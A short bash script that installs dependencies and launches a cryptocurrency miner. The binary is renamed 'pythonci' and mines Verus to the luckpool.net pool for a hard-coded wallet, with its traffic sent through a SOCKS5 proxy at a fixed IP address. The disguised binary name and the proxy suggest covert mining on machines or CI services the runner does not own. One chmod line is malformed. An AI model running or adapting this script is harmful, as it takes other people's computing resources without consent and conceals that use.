#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x gogok.sh && chmod +x pythonci chmod 777 pythonci gogok.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RKu27Yt8JVneLXvYKKxZeJMWSErijZYPnH
WR=BUAYA-180
PY=socks5://165.227.177.113:22984
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
